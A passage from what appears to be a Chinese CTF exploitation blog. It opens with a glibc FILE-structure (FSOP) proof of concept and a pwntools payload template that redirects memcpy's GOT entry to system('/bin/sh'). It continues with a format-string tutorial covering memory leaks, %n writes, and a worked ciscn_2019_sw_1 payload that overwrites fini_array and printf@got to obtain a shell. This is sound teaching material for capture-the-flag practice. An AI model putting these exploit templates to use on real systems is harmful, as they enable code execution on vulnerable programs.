<span class="number">2</span>;</span><br><span class="line">    <span class="type">size_t</span> *fake_wide_data = fake_helper_file + <span class="number">28</span>;</span><br><span class="line">    <span class="type">size_t</span> *fake_put_stream = fake_helper_file + <span class="number">6</span>;</span><br><span class="line">    <span class="type">size_t</span> *write_base = fake_helper_file + <span class="number">60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> memcpy_got_addr = libc_base + <span class="number">0x1d1040</span>;</span><br><span class="line">    <span class="type">size_t</span> IO_helper_jumps_addr = libc_base + <span class="number">0x1cdb20</span>;</span><br><span class="line">    <span class="type">size_t</span> IO_str_jumps_addr = libc_base + <span class="number">0x1ce720</span>;</span><br><span class="line"></span><br><span class="line">    fake_helper_file[<span class="number">4</span>] = <span class="number">0</span>;                        <span class="comment">// _IO_write_base</span></span><br><span class="line">    fake_helper_file[<span class="number">5</span>] = <span class="number">1</span>;                        <span class="comment">// _IO_write_ptr</span></span><br><span class="line">    fake_helper_file[<span class="number">17</span>] = (<span class="type">size_t</span>) large + <span class="number">0x1000</span>; <span class="comment">// _lock -&gt; rw memory</span></span><br><span class="line">    fake_helper_file[<span class="number">20</span>] = (<span class="type">size_t</span>) fake_wide_data; <span class="comment">// _wide_data</span></span><br><span class="line">    fake_helper_file[<span class="number">27</span>] = IO_helper_jumps_addr;    <span class="comment">// vtable -&gt; _IO_helper_jumps</span></span><br><span class="line">    fake_helper_file[<span class="number">57</span>] = (<span class="type">size_t</span>) fake_put_stream;<span class="comment">// _put_stream</span></span><br><span class="line"></span><br><span class="line">    fake_wide_data[<span class="number">3</span>] = (<span class="type">size_t</span>) write_base;           <span class="comment">// _IO_write_base -&gt; write_base</span></span><br><span class="line">    fake_wide_data[<span class="number">4</span>] = (<span class="type">size_t</span>) write_base + <span class="number">0x80</span> * <span class="number">4</span>;<span class="comment">// _IO_write_base -&gt; write_base +</span></span><br><span class="line"></span><br><span class="line">    fake_put_stream[<span class="number">0</span>] = <span class="number">0x400</span>;                      <span class="comment">// _flags</span></span><br><span class="line">    fake_put_stream[<span class="number">1</span>] = (<span class="type">size_t</span>) &amp;write_base[<span class="number">2</span>] - <span class="number">1</span>;<span class="comment">// _IO_read_ptr -&gt; &amp;&quot;/bin/sh&quot; -1</span></span><br><span class="line">    fake_put_stream[<span class="number">4</span>] = memcpy_got_addr - <span class="number">0x20</span>;     <span class="comment">// _IO_write_base</span></span><br><span class="line">    fake_put_stream[<span class="number">5</span>] = memcpy_got_addr;            <span class="comment">// _IO_write_ptr</span></span><br><span class="line">    fake_put_stream[<span class="number">6</span>] = memcpy_got_addr + <span class="number">0x28</span>;     <span class="comment">// _IO_write_end</span></span><br><span class="line">    fake_put_stream[<span class="number">7</span>] = <span class="number">0</span>;                          <span class="comment">// _IO_buf_base</span></span><br><span class="line">    fake_put_stream[<span class="number">8</span>] = (<span class="type">size_t</span>) <span class="number">-1</span>;                <span class="comment">// _IO_buf_end</span></span><br><span class="line">    fake_put_stream[<span class="number">17</span>] = (<span class="type">size_t</span>) large + <span class="number">0x1000</span>;   <span class="comment">// _lock -&gt; rw memory</span></span><br><span class="line">    fake_put_stream[<span class="number">27</span>] = IO_str_jumps_addr;         <span class="comment">// vtable -&gt; _IO_str_jumps</span></span><br><span class="line"></span><br><span class="line">    write_base[<span class="number">0</span>] = (<span class="type">size_t</span>) system;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;write_base[<span class="number">2</span>], <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FSOP</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>攻击模板如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># largebin_attack 攻击 house_魑魅魍魉</span></span><br><span class="line"><span class="comment"># 为确保正确执行，需要利用 COMPILE_WPRINTF==1 的模式</span></span><br><span class="line"> </span><br><span class="line">fake_io_addr = heap_addr + <span class="number">0x1390</span></span><br><span class="line">put_stream_offset = <span class="number">0x30</span>  <span class="comment"># put_stream 距离 fake_io 的偏移</span></span><br><span class="line">put_stream_addr = fake_io_addr + put_stream_offset</span><br><span class="line">write_target_addr = memcpy_addr</span><br><span class="line">target_value_offset = <span class="number">0x200</span>  <span class="comment"># 需要执行的函数存储的地址距离 fake_io 的偏移</span></span><br><span class="line">target_value_addr = fake_io_addr  + target_value_offset</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">IO_wide_data_addr = fake_io_addr + <span class="number">0xe0</span> <span class="comment"># len(IO_IFLE) 利用原有的宽字符</span></span><br><span class="line"><span class="comment"># 再一次执行到 memcpy时rdi的地址</span></span><br><span class="line">rdi_offset = <span class="number">0xf</span>  <span class="comment"># 因为 _IO_write_ptr 会加1，此处确保内存对齐</span></span><br><span class="line">rdi_addr = target_value_addr + rdi_offset</span><br><span class="line"><span class="comment"># more_len &gt; count_len &gt; 0x20 可以再次执行 memcpy</span></span><br><span class="line">more_len = <span class="number">0x80</span>*<span class="number">8</span>   <span class="comment"># 为什么 IO_help_jump_0_ 里面还要在右边移位2位？？</span></span><br><span class="line">count_len= <span class="number">0x28</span> <span class="comment"># 要大于0x20</span></span><br><span class="line">_flags = <span class="number">0x400</span> <span class="comment">#_flags == 0x400 执行 fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">fake_io_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(_flags) <span class="comment"># 此处是 put_stream 起始地址; _flags == 0x400 执行 fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span></span><br><span class="line">fake_io_file += p64(rdi_addr)</span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io_file += p64(write_target_addr - <span class="number">0x20</span>)</span><br><span class="line">fake_io_file += p64(write_target_addr)</span><br><span class="line">fake_io_file += p64(write_target_addr + count_len)</span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 用于绕过  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only)) 不执行malloc</span></span><br><span class="line">fake_io_file += p64((<span class="number">1</span>&lt;&lt;<span class="number">64</span>)-<span class="number">1</span>)</span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io_file += p64(heap_addr+<span class="number">0x2000</span>) <span class="comment">#可写</span></span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io_file += p64(IO_wide_data_addr)</span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(IO_help_jump_0_addr)</span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_io_file += p64(heap_addr+<span class="number">0x2000</span>) <span class="comment">#可写</span></span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_io_file += p64(target_value_addr)</span><br><span class="line">fake_io_file += p64(target_value_addr + more_len)</span><br><span class="line">fake_io_file += p64(IO_str_jumps_addr)</span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0x1b8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(put_stream_addr)</span><br><span class="line">fake_io_file = fake_io_file.ljust(target_value_offset - <span class="number">0x10</span>,<span class="string">b&quot;\x00&quot;</span>)  <span class="comment"># largbin_attak 时需要 - 0x10</span></span><br><span class="line"> </span><br><span class="line">fake_io_file += p64(system_addr) + p64(<span class="number">0</span>)   <span class="comment"># 此段长度为 0x10 与 rdi_offset 对应</span></span><br><span class="line"> </span><br><span class="line">payload = fake_io_file + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br></pre></td></tr></table></figure></div>
]]></content>
  </entry>
  <entry>
    <title>linux 格式化字符串利用</title>
    <url>/2024/11/08/linux-format-string-exploit/</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="常见格式化字符串函数"><a href="#常见格式化字符串函数" class="headerlink" title="常见格式化字符串函数"></a>常见格式化字符串函数</h2><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">基本介绍</th>
</tr>
</thead>
<tbody><tr>
<td align="left">printf</td>
<td align="left">输出到stdout</td>
</tr>
<tr>
<td align="left">fprintf</td>
<td align="left">输出到指定FILE流</td>
</tr>
<tr>
<td align="left">vprintf</td>
<td align="left">根据参数列表格式化输出到stdout</td>
</tr>
<tr>
<td align="left">vfprintf</td>
<td align="left">根据参数列表格式化输出到FILE流</td>
</tr>
<tr>
<td align="left">sprintf</td>
<td align="left">输出到字符串</td>
</tr>
<tr>
<td align="left">snprintf</td>
<td align="left">输出指定字节数到字符串</td>
</tr>
<tr>
<td align="left">vsprintf</td>
<td align="left">根据参数列表格式化输出到字符串</td>
</tr>
<tr>
<td align="left">vsnprintf</td>
<td align="left">根据参数列表格式化输出指定字节到字符串</td>
</tr>
</tbody></table>
<h2 id="常用格式化字符串形式"><a href="#常用格式化字符串形式" class="headerlink" title="常用格式化字符串形式"></a>常用格式化字符串形式</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>parameter</code>：<code>n$</code> ，获取格式化字符串中的指定第 n 个参数</li>
<li><code>flags</code>：在 <code>width</code> 设置后指定可以用来作为填充的内容之类的内容</li>
<li><code>field width</code>：输出的最小宽度</li>
<li><code>precision</code>：输出的最大长度</li>
<li><code>length</code>：输出的长度<ul>
<li><code>hh</code>：输出一个字节</li>
<li><code>h</code>：输出一个双字节</li>
</ul>
</li>
<li><code>type</code>：<ul>
<li><code>d/i</code>：有符号整数</li>
<li><code>u</code>：无符号整数</li>
<li><code>x</code>&#x2F;<code>X</code>：16 进制</li>
<li><code>o</code>：8 进制</li>
<li><code>s</code>：字符串指针指向的字符串</li>
<li><code>c</code>：<code>char</code> 类型单个字符</li>
<li><code>p</code>：<code>void *</code> 型，输出对应变量的值。例如 <code>printf(&quot;%p&quot;,a)</code> 用地址的格式打印变量 <code>a</code> 的值，<code>printf(&quot;%p&quot;, &amp;a)</code> 打印变量 a 所在的地址。</li>
<li><code>n</code>：不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。<ul>
<li><code>hhn</code>：写 1 字节</li>
<li><code>hn</code>：写 2 字节</li>
<li><code>n</code>：写 4 字节</li>
<li><code>ln</code>：32 位写 4 字节，64 位写 8 字节</li>
<li><code>lln</code>：写 8 字节</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="原理验证"><a href="#原理验证" class="headerlink" title="原理验证"></a>原理验证</h1><p>示例程序：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>] = <span class="string">&quot;aaaa.%p.%p.%p.%p.%p.%p.%p&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><p>编译命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc test.c -g -m32 -o test</span><br></pre></td></tr></table></figure></div>

<p>输出结果：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaaa.0x20.(nil).0x565561c5.(nil).(nil).0x61616161.0x2e70252e</span><br></pre></td></tr></table></figure></div>

<p>栈结构：</p>
<pre>00:0000│ <b>esp</b> <font color="#A2734C">0xffffd030</font> —▸ <font color="#A2734C">0xffffd048</font> ◂— &apos;aaaa.%p.%p.%p.%p.%p.%p.%p&apos;
01:0004│-094 <font color="#A2734C">0xffffd034</font> ◂— 0x20 /* &apos; &apos; */
02:0008│-090 <font color="#A2734C">0xffffd038</font> ◂— 0
03:000c│-08c <font color="#A2734C">0xffffd03c</font> —▸ <font color="#C01C28">0x565561c5 (main+24)</font> ◂— <font color="#AFD700">add</font><font color="#FFFFFF"> </font><font color="#5FD7FF">ebx</font><font color="#FFFFFF">, </font><font color="#AF87FF">0x2e0f</font>
04:0010│-088 <font color="#A2734C">0xffffd040</font> ◂— 0
05:0014│-084 <font color="#A2734C">0xffffd044</font> ◂— 0
06:0018│ <b>eax</b> <font color="#A2734C">0xffffd048</font> ◂— &apos;aaaa.%p.%p.%p.%p.%p.%p.%p&apos;
07:001c│-07c <font color="#A2734C">0xffffd04c</font> ◂— &apos;.%p.%p.%p.%p.%p.%p.%p&apos;
</pre>

<p>自上而下依次是参数 0~6，参数 0 为格式化字符串地址，而格式化字符串前 4 字节又作为参数 6（由于栈结构不同，需要视情况而定）。因此如果将格式化字符串合适的位置设置为目标地址就可以对该地址的数据进行操作。</p>
<h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><p>编译命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc test.c -g -m64 -o test</span><br></pre></td></tr></table></figure></div>

<p>输出结果：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaaa.0x7fffffffdfe8.0x70.0x555555557db8.0x7ffff7e1bf10.0x7ffff7fc9040.0x2e70252e61616161.0x70252e70252e7025</span><br></pre></td></tr></table></figure></div>

<p>寄存器：</p>
<pre><font color="#C01C28">*</font><font color="#C01C28"><b>RAX </b></font> 0x6b
 <b>RBX </b> 0
<font color="#C01C28">*</font><font color="#C01C28"><b>RCX </b></font> 1
<font color="#C01C28">*</font><font color="#C01C28"><b>RDX </b></font> 0
<font color="#C01C28">*</font><font color="#C01C28"><b>RDI </b></font> <font color="#A2734C">0x7fffffffd900</font> —▸ <font color="#C01C28">0x7ffff7c62050 (funlockfile)</font> ◂— <font color="#AFD700">endbr64</font><font color="#FFFFFF"> </font>
<font color="#C01C28">*</font><font color="#C01C28"><b>RSI </b></font> <font color="#A2734C">0x7fffffffde79</font> ◂— 0
<font color="#C01C28">*</font><font color="#C01C28"><b>R8  </b></font> 0
<font color="#C01C28">*</font><font color="#C01C28"><b>R9  </b></font> <font color="#A2734C">0x7fffffffdd28</font> ◂— &apos;70252e70252e7025&apos;
<font color="#C01C28">*</font><font color="#C01C28"><b>R10 </b></font> 0
<font color="#C01C28">*</font><font color="#C01C28"><b>R11 </b></font> 0x70252e70252e7025 (&apos;%p.%p.%p&apos;)
 <b>R12 </b> <font color="#A2734C">0x7fffffffdfe8</font> —▸ <font color="#A2734C">0x7fffffffe368</font> ◂— &apos;/home/sky123/Desktop/t&apos;
 <b>R13 </b> <font color="#C01C28">0x555555555169 (main)</font> ◂— <font color="#AFD700">endbr64</font><font color="#FFFFFF"> </font>
 <b>R14 </b> 0x555555557db8 (__do_global_dtors_aux_fini_array_entry) —▸ <font color="#C01C28">0x555555555120 (__do_global_dtors_aux)</font> ◂— <font color="#AFD700">endbr64</font><font color="#FFFFFF"> </font>
 <b>R15 </b> <font color="#A347BA">0x7ffff7ffd040 (_rtld_global)</font> —▸ <font color="#A347BA">0x7ffff7ffe2e0</font> —▸ 0x555555554000 ◂— 0x10102464c457f
 <b>RBP </b> <font color="#A2734C">0x7fffffffded0</font> ◂— 1
 <b>RSP </b> <font color="#A2734C">0x7fffffffde60</font> ◂— &apos;aaaa.%p.%p.%p.%p.%p.%p.%p&apos;
<font color="#C01C28">*</font><font color="#C01C28"><b>RIP </b></font> <font color="#C01C28">0x55555555520f (main+166)</font> ◂— <font color="#AFD700">mov</font><font color="#FFFFFF"> </font><font color="#5FD7FF">eax</font><font color="#FFFFFF">, </font><font color="#AF87FF">0</font>
</pre>

<p>栈结构：</p>
<pre>00:0000│ <b>rsp  </b> <font color="#A2734C">0x7fffffffde60</font> ◂— &apos;aaaa.%p.%p.%p.%p.%p.%p.%p&apos;
01:0008│-068   <font color="#A2734C">0x7fffffffde68</font> ◂— &apos;%p.%p.%p.%p.%p.%p&apos;
02:0010│-060   <font color="#A2734C">0x7fffffffde70</font> ◂— &apos;.%p.%p.%p&apos;
03:0018│ <b>rsi-1</b> <font color="#A2734C">0x7fffffffde78</font> ◂— 0x70 /* &apos;p&apos; */
04:0020│-050   <font color="#A2734C">0x7fffffffde80</font> ◂— 0
... ↓          3 skipped
</pre>

<p>由于 64 位程序先使用 <code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code> 寄存器作为函数参数的前六个参数，多余的参数会依次压在栈上，因此前6个输出的为寄存器中的值（<code>aaaa</code> 看做是格式化字符串参数），格式化字符串前 8 个字节作为参数 6。</p>
<h1 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h1><h2 id="泄露栈变量内存"><a href="#泄露栈变量内存" class="headerlink" title="泄露栈变量内存"></a>泄露栈变量内存</h2><h3 id="泄露栈变量的值"><a href="#泄露栈变量的值" class="headerlink" title="泄露栈变量的值"></a>泄露栈变量的值</h3><p>获取栈中被视为第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 个参数的值：<code>%n$x</code>（<code>%n$p</code>）</p>
<p><strong>注意：<code>%x</code> 其实只是 <code>%d</code> 的 16 进制输出，对应的是 32 位也就是 4 字节；在 64 位操作系统下，只会截取后 32 位；<code>%p</code> 和系统位数关联没有问题，因此建议用 <code>%p</code> 。</strong></p>
<h3 id="泄露栈变量对应对应地址的内容"><a href="#泄露栈变量对应对应地址的内容" class="headerlink" title="泄露栈变量对应对应地址的内容"></a>泄露栈变量对应对应地址的内容</h3><p>获取栈中被视为第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 个参数对应地址的内容：<code>%n$s</code></p>
<h2 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h2><p>获取地址addr对应的值（addr为第k个参数）：<code>addr%k$s</code></p>
<h1 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h1><p>覆盖内存的原理是 <code>%k$n</code> 可以覆盖第 k 个参数指向的地址为已经输出的字符数量。</p>
<p><strong>注意：覆盖内存只能覆盖栈上某地址指向的内存，而不是直接覆盖栈上某地址。</strong></p>
<h2 id="pwntools生成payload"><a href="#pwntools生成payload" class="headerlink" title="pwntools生成payload"></a>pwntools生成payload</h2><p>对于格式化字符串payload，pwntools也提供了一个可以直接使用的类Fmtstr，具体文档见<a class="link"   href="http://docs.pwntools.com/en/stable/fmtstr.html%EF%BC%8C%E6%88%91%E4%BB%AC%E8%BE%83%E5%B8%B8%E4%BD%BF%E7%94%A8%E7%9A%84%E5%8A%9F%E8%83%BD%E6%98%AF" >http://docs.pwntools.com/en/stable/fmtstr.html，我们较常使用的功能是 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">fmtstr_payload(offset, &#123;address:data&#125;, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>offset</code>：表示格式化字符串的偏移</li>
<li><code>numbwritten</code>：表示已经输出的字符个数</li>
<li><code>write_size</code>：表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着 <code>hhn</code>、<code>hn</code> 和 <code>n</code>，默认值是 byte，即按 <code>hhn</code> 写。</li>
</ul>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>部分题目会限制时间，导致pwntools生成的payload失效。一般这一类题目可以通过仅修改低地址等操作减小输出长度，这时需要手动构造payload。</p>

    </div>
  </div>

<h2 id="手动构造payload"><a href="#手动构造payload" class="headerlink" title="手动构造payload"></a>手动构造payload</h2><h3 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h3><p>对于小于机器字长的数字，如果把地址放在格式化字符串前面会使得已输出字符个数大于数字大小，因此要将地址放在后面。</p>
<p>以数字2为例：<code>aa%k$n[padding][addr]</code></p>
<h3 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h3><p>直接一次性输出大数字个字节来进行覆盖时间过长，因此需要把大数字拆分成若干个部分，分别进行覆盖。比如<code>hhn</code>按字节写或<code>hn</code>按双字写。</p>
<p>以<code>hhn</code>写入32bit数为例，payload形式为：<code>[addr][addr+1][addr+2][addr+3][pad1]%k$hhn[pad2]%(k+1)$hhn[pad3]%(k+2)$hhn[pad4]%(k+3)$hhn</code></p>
<h4 id="例题：ciscn-2019-sw-1"><a href="#例题：ciscn-2019-sw-1" class="headerlink" title="例题：ciscn_2019_sw_1"></a>例题：ciscn_2019_sw_1</h4><p><a class="link"   href="https://gitcode.net/qq_45323960/buuoj/-/tree/master/ciscn_2019_sw_1" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>保护情况：</p>
<pre>    Arch:     i386-32-little
    RELRO:    <font color="#C01C28">No RELRO</font>
    Stack:    <font color="#C01C28">No canary found</font>
    NX:       <font color="#26A269">NX enabled</font>
    PIE:      <font color="#C01C28">No PIE (0x8048000)</font>
</pre>
<p>主程序典型的格式化字符串漏洞。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-format-string-exploit/images/e292e1e5e50f6bb76433f2c2e0dfba34.png"
                      alt="在这里插入图片描述"
                ><br><code>init_array</code> 和 <code>fini_array</code> 中存放的函数指针分别在加载和结束时依次调用，且仅在 <code>RELRO</code> 为 <code>NO RELRO</code> 时可以修改。为了多次利用格式化字符串漏洞，需要将 <code>fini_array</code> 修改为 <code>main</code> 函数地址。<br>第一次执行 <code>main</code> 函数将 <code>fini_array</code>  修改为 <code>main</code> 函数地址，且将 <code>printf@got</code> 修改为 <code>system@plt</code> 。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>地址</th>
</tr>
</thead>
<tbody><tr>
<td><code>fini_array</code></td>
<td>0x0804979C</td>
</tr>
<tr>
<td><code>main</code></td>
<td>0x08048534</td>
</tr>
<tr>
<td><code>printf@got</code></td>
<td>0x0804989C</td>
</tr>
<tr>
<td><code>system@plt</code></td>
<td>0x080483D0</td>
</tr>
</tbody></table>
<p><code>payload</code> 为：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">payload = <span class="built_in">p32</span>(fini_array<span class="number">+2</span>) + <span class="built_in">p32</span>(printf_got<span class="number">+2</span>) </span><br><span class="line">payload += <span class="built_in">p32</span>(printf_got) + <span class="built_in">p32</span>(fini_array)</span><br><span class="line">payload += <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x0804</span><span class="number">-0x10</span>)+<span class="string">&quot;c&quot;</span> + <span class="string">&quot;%4$hn&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%5$hn&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x83D0</span><span class="number">-0x0804</span>)+<span class="string">&quot;c&quot;</span> + <span class="string">&quot;%6$hn&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x8534</span><span class="number">-0x83D0</span>)+<span class="string">&quot;c&quot;</span> + <span class="string">&quot;%7$hn&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>第二次执行 <code>main</code> 函数 发送 <code>\bin\sh</code> 获取 <code>shell</code> 。</p>
<h2 id="堆上格式化字符串通用解法"><a href="#堆上格式化字符串通用解法" class="headerlink" title="堆上格式化字符串通用解法"></a>堆上格式化字符串通用解法</h2><h3 id="例题：2022-Midnight-Sun-CTF-speed6"><a href="#例题：2022-Midnight-Sun-CTF-speed6" class="headerlink" title="例题：2022 Midnight Sun CTF speed6"></a>例题：2022 Midnight Sun CTF speed6</h3><p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/2022MidnightSunCTF_speed6" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>存在一个堆上格式化字符串。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> canary; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  canary = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;f5b: &quot;</span>);</span><br><span class="line">  fgets(buf, <span class="number">0x100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">free</span>(buf);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>main</code> 函数循环调用 <code>call_vuln</code> 函数，而 <code>call_vuln</code> 函数经过多层函数调用最终调用到 <code>vuln</code> 函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  banner();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    call_vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>首先通过格式化字符串漏洞我们可以泄露栈地址和 libc 基址。</p>
<p>之后考虑构造任意地址写原语。由于格式化字符串在堆上，我们不能直接在栈上布置要写入的地址，因此需要借助栈上的 ebp 链进行构造。</p>
